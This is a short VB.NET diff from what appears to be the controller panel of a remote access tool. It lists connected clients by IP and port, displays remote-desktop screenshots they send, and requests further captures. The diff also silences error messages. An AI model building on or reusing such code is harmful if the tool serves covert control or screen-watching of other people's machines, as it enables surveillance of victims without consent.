@@ -11,7 +11,7 @@
                 Case "INFO"
                     If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
 
-                        C.L = F.LV1.Items.Insert(0, C.IP.Split(":")(0))
+                        C.L = F.LV1.Items.Insert(0, String.Concat(C.IP.Split(":")(0), ":", C.C.LocalEndPoint.ToString.Split(":")(1)))
                         C.L.Tag = C
                         For i As Integer = 1 To A.Length - 1
                             C.L.SubItems.Add(A(i))
@@ -43,7 +43,7 @@
                             Dim MM = New IO.MemoryStream(Text.Encoding.Default.GetBytes(A(1)))
                             RD.PictureBox1.Image = Image.FromStream(MM)
                             MM.Dispose()
-                            If RD.Button1.Text = "Capturing..." Then
+                            If RD.Button1.Text = "Capturing..." AndAlso RD.isOK = True Then
                                 Dim Bb As Byte() = SB("RD+" + Settings.SPL + RD.PictureBox1.Width.ToString + Settings.SPL + RD.PictureBox1.Height.ToString)
                                 Try
                                     Dim ClientReq As New Outcoming_Requests(C, Bb)
@@ -59,7 +59,7 @@
             End Select
             Exit Sub
         Catch ex As Exception
-            MsgBox(ex.Message)
+            ' MsgBox(ex.Message)
         End Try
     End Sub
 
